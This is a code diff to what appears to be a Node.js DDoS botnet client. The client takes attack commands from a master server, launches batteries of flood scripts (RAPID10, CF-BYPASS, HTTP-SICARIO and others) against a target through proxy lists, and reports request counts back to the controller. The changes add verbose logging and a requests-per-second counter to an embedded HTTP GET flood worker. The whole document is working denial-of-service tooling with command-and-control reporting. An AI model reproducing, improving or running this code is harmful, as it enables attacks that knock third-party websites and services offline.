@@ -54,6 +54,8 @@ function log(message, type = 'info') {
     case 'error': console.log(color(`${prefix} ❌ ${message}`, colors.red)); break;
     case 'warning': console.log(color(`${prefix} ⚠️ ${message}`, colors.yellow)); break;
     case 'info': console.log(color(`${prefix} ℹ️ ${message}`, colors.cyan)); break;
+    case 'attack': console.log(color(`${prefix} 🔥 ${message}`, colors.magentaBright)); break;
+    case 'exec': console.log(color(`${prefix} ⚡ ${message}`, colors.blueBright)); break;
     default: console.log(`${prefix} ${message}`);
   }
 }
@@ -227,7 +229,7 @@ async function checkForCommands() {
         stopAllAttacks();
       } else if (command.action === 'attack') {
         const { target, time, methods } = command;
-        log(`Attack: ${methods} → ${target} for ${time}s`, 'info');
+        log(`Attack: ${methods} → ${target} for ${time}s`, 'attack');
         executeAttack(target, time, methods);
       }
     }
@@ -255,26 +257,40 @@ function executeAttack(target, time, methods) {
   requestCount = 0;
   attackStartTime = Date.now();
 
-  const execWithLog = (cmd) => {
+  const execWithLog = (cmd, scriptName) => {
+    log(`🚀 EXECUTING: ${scriptName}`, 'exec');
+    log(`📝 Command: ${cmd}`, 'exec');
+    
     const proc = exec(cmd, { 
       detached: true, 
       maxBuffer: 1024 * 1024,
       shell: true,
       cwd: __dirname
     }, (error, stdout, stderr) => {
-      if (error && error.code !== 'SIGTERM') return;
+      if (error && error.code !== 'SIGTERM') {
+        log(`❌ ${scriptName} error: ${error.message}`, 'error');
+        return;
+      }
       if (stdout) {
         const lines = stdout.split('\n');
         lines.forEach(line => {
-          if (line.includes('Request') || line.includes('GET') || line.includes('POST') || 
-              line.includes('Sent') || line.includes('packet') || line.includes('connection')) {
-            requestCount++;
-            totalRequests++;
+          if (line.trim()) {
+            if (line.includes('Request') || line.includes('GET') || line.includes('POST') || 
+                line.includes('Sent') || line.includes('packet') || line.includes('connection') ||
+                line.includes('RPS') || line.includes('rate')) {
+              requestCount++;
+              totalRequests++;
+              log(`📊 ${scriptName} output: ${line.trim()}`, 'info');
+            }
           }
         });
       }
+      if (stderr && stderr.trim()) {
+        log(`⚠️ ${scriptName} stderr: ${stderr.trim()}`, 'warning');
+      }
     });
     
+    // Capture stdout in real-time
     let stdoutBuffer = '';
     proc.stdout.on('data', (data) => {
       stdoutBuffer += data.toString();
@@ -283,20 +299,39 @@ function executeAttack(target, time, methods) {
       lines.forEach(line => {
         if (line.trim()) {
           if (line.includes('Request') || line.includes('GET') || line.includes('POST') || 
-              line.includes('Sent') || line.includes('packet') || line.includes('connection')) {
+              line.includes('Sent') || line.includes('packet') || line.includes('connection') ||
+              line.includes('RPS') || line.includes('rate')) {
             requestCount++;
             totalRequests++;
+            log(`📊 ${scriptName} output: ${line.trim()}`, 'info');
           }
         }
       });
     });
     
+    // Log when process starts
+    proc.on('spawn', () => {
+      log(`✅ ${scriptName} started (PID: ${proc.pid})`, 'success');
+    });
+    
+    // Log when process exits
+    proc.on('exit', (code, signal) => {
+      if (code === 0) {
+        log(`✅ ${scriptName} completed successfully`, 'success');
+      } else if (code !== null) {
+        log(`⚠️ ${scriptName} exited with code ${code}`, 'warning');
+      }
+    });
+    
     activeProcesses.push(proc);
+    
+    // Auto-stop after time
     setTimeout(() => {
       const index = activeProcesses.indexOf(proc);
       if (index > -1) {
         try { 
           proc.kill('SIGTERM'); 
+          log(`⏹️ ${scriptName} stopped after ${time}s`, 'warning');
         } catch (e) {}
         activeProcesses.splice(index, 1);
       }
@@ -308,57 +343,84 @@ function executeAttack(target, time, methods) {
   const uaFile = path.join(botDir, 'ua.txt');
   const methodsDir = path.join(__dirname, 'methods');
   
+  log(`\n${'='.repeat(60)}`, 'info');
+  log(`🔥 STARTING ATTACK: ${methods}`, 'attack');
+  log(`🎯 Target: ${target}`, 'attack');
+  log(`⏱️ Duration: ${time}s`, 'attack');
+  log(`${'='.repeat(60)}`, 'info');
+  
   switch(methods) {
     case 'RAPID10':
-      execWithLog(`node ${path.join(methodsDir, 'r10-rapid.js')} ${target} ${time} 30 ${proxyFile} ${uaFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'r10-tcp.js')} ${target} ${time} ${proxyFile} ${uaFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'r10-tls.js')} ${target} ${time} ${proxyFile} ${uaFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'r10-conn.js')} ${target} ${time} ${proxyFile} ${uaFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'r10-header.js')} ${target} ${time} 30 ${proxyFile} ${uaFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'r10-frag.js')} ${target} ${time} ${proxyFile} ${uaFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'r10-pipe.js')} ${target} ${time} ${proxyFile} ${uaFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'r10-cookie.js')} ${target} ${time} ${proxyFile} ${uaFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'r10-mixed.js')} ${target} ${time} ${proxyFile} ${uaFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'r10-lowcpu.js')} ${target} ${time} 40 ${proxyFile} ${uaFile}`);
+      log('📦 Launching RAPID10 attack suite (10 methods)', 'attack');
+      execWithLog(`node ${path.join(methodsDir, 'r10-rapid.js')} ${target} ${time} 30 ${proxyFile} ${uaFile}`, 'r10-rapid.js');
+      execWithLog(`node ${path.join(methodsDir, 'r10-tcp.js')} ${target} ${time} ${proxyFile} ${uaFile}`, 'r10-tcp.js');
+      execWithLog(`node ${path.join(methodsDir, 'r10-tls.js')} ${target} ${time} ${proxyFile} ${uaFile}`, 'r10-tls.js');
+      execWithLog(`node ${path.join(methodsDir, 'r10-conn.js')} ${target} ${time} ${proxyFile} ${uaFile}`, 'r10-conn.js');
+      execWithLog(`node ${path.join(methodsDir, 'r10-header.js')} ${target} ${time} 30 ${proxyFile} ${uaFile}`, 'r10-header.js');
+      execWithLog(`node ${path.join(methodsDir, 'r10-frag.js')} ${target} ${time} ${proxyFile} ${uaFile}`, 'r10-frag.js');
+      execWithLog(`node ${path.join(methodsDir, 'r10-pipe.js')} ${target} ${time} ${proxyFile} ${uaFile}`, 'r10-pipe.js');
+      execWithLog(`node ${path.join(methodsDir, 'r10-cookie.js')} ${target} ${time} ${proxyFile} ${uaFile}`, 'r10-cookie.js');
+      execWithLog(`node ${path.join(methodsDir, 'r10-mixed.js')} ${target} ${time} ${proxyFile} ${uaFile}`, 'r10-mixed.js');
+      execWithLog(`node ${path.join(methodsDir, 'r10-lowcpu.js')} ${target} ${time} 40 ${proxyFile} ${uaFile}`, 'r10-lowcpu.js');
       break;
+      
     case 'RAW-GET':
-      execWithLog(`node ${path.join(methodsDir, 'raw-get.js')} ${target} ${time} 20 800`);
+      log('📦 Launching RAW-GET attack', 'attack');
+      execWithLog(`node ${path.join(methodsDir, 'raw-get.js')} ${target} ${time} 20 800`, 'raw-get.js');
       break;
+      
     case 'CF-BYPASS':
-      execWithLog(`node ${path.join(methodsDir, 'cf-bypass.js')} ${target} ${time} 4 32 ${proxyFile}`);
+      log('📦 Launching CF-BYPASS attack', 'attack');
+      execWithLog(`node ${path.join(methodsDir, 'cf-bypass.js')} ${target} ${time} 4 32 ${proxyFile}`, 'cf-bypass.js');
       break;
+      
     case 'MODERN-FLOOD':
-      execWithLog(`node ${path.join(methodsDir, 'modern-flood.js')} ${target} ${time} 4 64 ${proxyFile}`);
+      log('📦 Launching MODERN-FLOOD attack', 'attack');
+      execWithLog(`node ${path.join(methodsDir, 'modern-flood.js')} ${target} ${time} 4 64 ${proxyFile}`, 'modern-flood.js');
       break;
+      
     case 'HTTP-SICARIO':
-      execWithLog(`node ${path.join(methodsDir, 'REX-COSTUM.js')} ${target} ${time} 32 6 ${proxyFile} --randrate --full --legit --query 1`);
-      execWithLog(`node ${path.join(methodsDir, 'cibi.js')} ${target} ${time} 16 3 ${proxyFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 32 2 ${proxyFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time} 12 4 ${proxyFile}`);
+      log('📦 Launching HTTP-SICARIO attack suite (4 methods)', 'attack');
+      execWithLog(`node ${path.join(methodsDir, 'REX-COSTUM.js')} ${target} ${time} 32 6 ${proxyFile} --randrate --full --legit --query 1`, 'REX-COSTUM.js');
+      execWithLog(`node ${path.join(methodsDir, 'cibi.js')} ${target} ${time} 16 3 ${proxyFile}`, 'cibi.js');
+      execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 32 2 ${proxyFile}`, 'BYPASS.js');
+      execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time} 12 4 ${proxyFile}`, 'nust.js');
       break;
+      
     case 'R9':
-      execWithLog(`node ${path.join(methodsDir, 'high-dstat.js')} ${target} ${time} 32 7 ${proxyFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'w-flood1.js')} ${target} ${time} 8 3 ${proxyFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'vhold.js')} ${target} ${time} 16 2 ${proxyFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time} 16 2 ${proxyFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 8 1 ${proxyFile}`);
+      log('📦 Launching R9 attack suite (5 methods)', 'attack');
+      execWithLog(`node ${path.join(methodsDir, 'high-dstat.js')} ${target} ${time} 32 7 ${proxyFile}`, 'high-dstat.js');
+      execWithLog(`node ${path.join(methodsDir, 'w-flood1.js')} ${target} ${time} 8 3 ${proxyFile}`, 'w-flood1.js');
+      execWithLog(`node ${path.join(methodsDir, 'vhold.js')} ${target} ${time} 16 2 ${proxyFile}`, 'vhold.js');
+      execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time} 16 2 ${proxyFile}`, 'nust.js');
+      execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 8 1 ${proxyFile}`, 'BYPASS.js');
       break;
+      
     case 'R1':
-      execWithLog(`node ${path.join(methodsDir, 'vhold.js')} ${target} ${time} 15 2 ${proxyFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'high-dstat.js')} ${target} ${time} 64 2 ${proxyFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'cibi.js')} ${target} ${time} 4 2 ${proxyFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 16 2 ${proxyFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'REX-COSTUM.js')} ${target} ${time} 32 6 ${proxyFile} --randrate --full --legit --query 1`);
-      execWithLog(`node ${path.join(methodsDir, 'w-flood1.js')} ${target} ${time} 8 3 ${proxyFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'vhold.js')} ${target} ${time} 16 2 ${proxyFile}`);
-      execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time} 32 3 ${proxyFile}`);
+      log('📦 Launching R1 attack suite (8 methods)', 'attack');
+      execWithLog(`node ${path.join(methodsDir, 'vhold.js')} ${target} ${time} 15 2 ${proxyFile}`, 'vhold.js');
+      execWithLog(`node ${path.join(methodsDir, 'high-dstat.js')} ${target} ${time} 64 2 ${proxyFile}`, 'high-dstat.js');
+      execWithLog(`node ${path.join(methodsDir, 'cibi.js')} ${target} ${time} 4 2 ${proxyFile}`, 'cibi.js');
+      execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 16 2 ${proxyFile}`, 'BYPASS.js');
+      execWithLog(`node ${path.join(methodsDir, 'REX-COSTUM.js')} ${target} ${time} 32 6 ${proxyFile} --randrate --full --legit --query 1`, 'REX-COSTUM.js');
+      execWithLog(`node ${path.join(methodsDir, 'w-flood1.js')} ${target} ${time} 8 3 ${proxyFile}`, 'w-flood1.js');
+      execWithLog(`node ${path.join(methodsDir, 'vhold.js')} ${target} ${time} 16 2 ${proxyFile}`, 'vhold.js');
+      execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time} 32 3 ${proxyFile}`, 'nust.js');
       break;
+      
     default:
       log(`Unknown method: ${methods}`, 'error');
   }
 
+  log(`${'='.repeat(60)}`, 'info');
+  log(`⏳ Attack running for ${time}s...`, 'info');
+  
+  // Send report after attack completes
   setTimeout(() => { 
-    if (requestCount > 0) sendReport(target, methods, requestCount, time); 
+    if (requestCount > 0) {
+      sendReport(target, methods, requestCount, time);
+    }
+    log(`📊 Attack complete - Total requests: ${requestCount}`, 'success');
   }, (parseInt(time) * 1000) + 2000);
 }
 
@@ -366,10 +428,16 @@ function executeAttack(target, time, methods) {
 async function sendReport(target, method, requestsMade, duration) {
   try {
     const axios = getApi();
-    await axios.post(`${MASTER_SERVER}/api/report`, { botId: BOT_ID, target, method, requests: requestsMade, duration });
-    log(`Report sent: ${requestsMade} requests`, 'info');
+    await axios.post(`${MASTER_SERVER}/api/report`, { 
+      botId: BOT_ID, 
+      target, 
+      method, 
+      requests: requestsMade, 
+      duration 
+    });
+    log(`📤 Report sent: ${requestsMade} requests`, 'success');
   } catch (error) {
-    // Silent fail
+    log('Failed to send report', 'warning');
   }
 }
 
@@ -436,6 +504,7 @@ if (cluster.isMaster) {
     setTimeout(() => process.exit(0), args.time * 1000 + 2000);
 } else {
     let running = true;
+    let requestCount = 0;
     const sendRequest = () => {
         if (!running) return;
         const req = httpLib.request({
@@ -445,12 +514,19 @@ if (cluster.isMaster) {
             method: 'GET',
             agent: agent,
             rejectUnauthorized: false
-        }, (res) => res.resume());
+        }, (res) => { 
+            requestCount++; 
+            res.resume(); 
+        });
         req.on('error', () => {});
         req.end();
         if (running) setImmediate(sendRequest);
     };
     for (let i = 0; i < 10; i++) sendRequest();
+    setInterval(() => {
+        console.log(\`📊 RPS: \${requestCount}/s\`);
+        requestCount = 0;
+    }, 1000);
     setTimeout(() => { running = false; process.exit(0); }, args.time * 1000);
 }`;
     fs.writeFileSync(rawGetPath, rawGetContent);
